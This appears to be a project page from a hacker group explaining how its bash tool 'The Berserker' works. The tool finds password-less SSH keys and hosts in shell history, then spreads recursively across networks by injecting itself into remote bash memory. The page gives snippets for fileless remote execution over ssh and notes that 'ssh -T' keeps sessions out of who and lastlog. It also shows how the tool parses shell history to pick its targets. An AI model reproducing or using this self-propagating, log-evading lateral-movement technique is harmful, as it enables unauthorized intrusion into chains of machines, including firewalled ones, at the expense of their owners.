---
layout: default
---
{:refdef: style="text-align: center;"}
## **A recursive, non-intrusive and ephemeral tool to find password-less private ssh-keys and build a hierarchical tree of reachable hosts**
{: refdef}

Random notes on how [The Berserker](../) works.

### Executive Summary
[The Berserker](../) is a bash script. At this point the reader either has a heart attack or multiple orgasms. There is no in-between.

### General
The Berserker looks for any password-less private ssh-key in ```~/.ssh``` and then gathers information from the User's shell history (```~/.bash_history```, ```.zsh_history``` and ```~/.history```) about any host the User connected to in the past. The Berserker then attempts to log into each host and injects itself into the remote's bash memory. It executes itself on the remote host and continues do do its deeds.

It keeps doing so until all ssh keys have been used and all hosts have been visited.

**Example**: User ```alice``` starts The Berserker on host ```Earth``` (the *origin*). The Berserker finds Alice's ssh-key and detects (from Alice's shell history) that ```alice``` frequently connects to ```Mars``` (as alice) and ```Jupiter``` (as root). The Berserker first connects to ```Mars``` and executes itself on ```Mars```. Let's assume The Berserker finds no further ssh-keys on ```Mars``` and so it will not spread beyond ```Mars```. Next it connects from ```Earth``` to ```Jupiter```. It's a root login to ```Jupiter``` and The Berserker finds many ssh-keys from various users. One such user is ```bob``` who frequently connects to ```Uranus``` and from there to ```Pluto```. Ultimately The Berserker will get to ```Pluto``` via a long ssh chain from ```Earth```->```Jupiter```->```Uranus```->```Pluto```.

At this point the educated reader will realise that The Berserker is *deep penetrating* ```Uranus```, e.g. ```Uranus``` gets owned even if firewalled or not being accessible from the Internet (but accessible from ```Jupiter```).

Berserker implements a text-based communication protocol via the stdin/stdout ssh-chain to send its findings back to ```Earth``` (the *origin* where The Berserker started).

### Bash In-Memory execution
Bash has this tremendous ability to load a script from a memory location and without the script needing to be stored on the target host.

```shell
cat >e.sh<<__EOF__
#! /bin/bash
echo "Hello '\$USER'"
__EOF__
S="$(cat e.sh | sed 's/\x27/\x27"\x27"\x27/g')"
ssh -Tn user@host.com "export SCRIPT='$S'; bash -c \"\$SCRIPT\""
```

1. Create a bash script named ```e.sh```.

1. Slurp the content into the variable ```$S``` after converting all ```'``` to ```'"'"'```. That's a bit freaky but hold your beer.

1. I use the hex notation (```\x27```) of ```'``` here or otherwise it would look rather complicated (```sed``` needs the ```'``` escaped so it is double-escaping time): ```S="$(cat e.sh | sed 's/'"'"'/'"'"'"'"'"'"'"'"'/g')"```. Most readers would commit suicide at this point. This is just to escape ```'``` correctly so that it can be passed to ```ssh``` as a command via a variable (```SCRIPT='$S'```) without interfering with the ```'``` around the ```$S```.

1. The ```ssh``` parameter ```-T``` stops the host from allocating a PTY but also stops the session from showing up in ```who``` and ```lastlog```. 

1. The long string ```export SCRIPT='$S'; bash -c \"\$SCRIPT\"``` is passed as a command to ```ssh``` to execute on the remote host. Note that the ```$``` in ```\"\$SCRIPT\"``` is escaped to prevent the local shell from substituting the variable. We like the remote bash (not the local one) to substitute ```$SCRIPT```. This is only needed because The Berserker needs to access the source of its own script (now stored in ```$SCRIPT``` to spread to further hosts). Otherwise ```bash -c '$S'``` would work.

No data is written to the target's host hard drive. All is kept in memory.

### Bash Command line parsing

There is no efficient way to convert a command line string from ```~/.bash_history``` to an array in bash. The programm ```xargs``` comes to the rescue but it can only execute another program with the command line string read from stdin. So we used ```xargs``` to call ```bash -c``` and output each command line argument in a separate line and then convert this into a bash array:
```shell
line="$(echo "ssh -i ~/.ssh/id_dsa\ key.dat root@openbsd.org" | xargs bash -c 'n=0; while [[ $n -le ${#} ]]; do eval eval echo "\$${n}"; n=$((n+1)); done')"
```

The variable ```line``` now contains
```
ssh
-i
/home/user/.ssh/id_dsa key.dat
root@openbsd.org
```

Note that the ```eval eval``` is needed. The first convert the ```${#}``` to the integer number of arguments passed to the bash by ```xargs``` and the second ```eval``` resolves the ```~/``` to the absolute directory name.

That format can now easily be split into an array like so:
```shell
IFS=$'\n' MyArray=($line)
```

We can add this into a nice bash function and have the bash-array returned by *pointer* (yes, bash can do pointers):

```shell
bash -l
cat >test.sh<<__EOF__
cmdline2array()
{
	local line
	# Double eval: 1st: To turn \$1 to argument string. 2nd to turn ~/.ssh to /home/user/.ssh
	line="\$(echo "\$2" | xargs bash -c 'n=0; while [[ \$n -le \${#} ]]; do eval eval echo "\\\$\${n}"; n=\$((n+1)); done')"
	# echo "LINES=\$line"
	IFS=$'\n' eval "\${1}=(\\\$line)"
	IFS=" "
}
__EOF__

# Now calling this function will store the arguments as array in 'MyArray':
source test.sh
cmdline2array MyArray "ssh -i ~/.ssh/id_dsa\ key.dat root@openbsd.org"
echo "Number of elements in MyArray: ${#MyArray[@]}"
# The output is '4'
echo "Content: ${MyArray[*]}"
# The output is: ssh -i /home/user/.ssh/id_dsa key.dat root@openbsd.org
```
 * Note how the *string* ```MyArray``` is passed as a function parameter (followed by the ssh command). Inside the function we use ```eval``` on that string to 'turn' the string-name (```MyArray```) into a bash variable. And that is how you (efficiently) pass one or more return values from the function back to the caller.

### Bash stderr and $? catching

The Berserker needs to check the error output of ```ssh``` _and_ also needs the exit-code of ```ssh```. The only way to do this in bash is to play file descriptor bonanza:
```shell
{ err="$( { echo 1>&2 "Hello-STDERR"; exit 123; } 2>&1 1>&3 3>&- )"; } 3>&1 || ret=$?
echo "Output ret=$ret err=$err"
```
* The ```echo 1>&2 "Hello-STDERR";``` generates some test output to STDERR.
* The ```exit 123;``` is some test exit code (123).

The output is ```Output ret=123 err=Hello-STDERR```.

### If you are reading this...

If you made it all the way to here then you are the type of person we like to speak to more. Join us on [Telegram](https://t.me/thcorg).

### Contact

Twitter: [https://twitter.com/hackerschoice](https://twitter.com/hackerschoice)  
Telegram: [https://t.me/thcorg](https://t.me/thcorg)  
Web: [https://www.thc.org](https://www.thc.org)  
Medium: [https://medium.com/@hackerschoice](https://medium.com/@hackerschoice)  
E-Mail: members@thc.org  


